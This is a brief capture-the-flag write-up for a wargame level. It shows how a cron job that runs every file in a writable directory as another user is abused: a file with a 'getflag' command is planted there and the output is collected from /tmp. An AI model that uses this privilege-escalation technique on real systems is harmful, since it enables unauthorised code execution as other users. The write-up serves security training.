#Solution

```bash
$>cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

> crontab configuration of a command launch by flag05 every two min

```bash
$>cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

> for each file in /opt/openarenaserver exec a bash with a cmd

```bash
$>echo "getflag > /tmp/ez" > /opt/openarenaserver/ok
$>cat /tmp/ez
...
```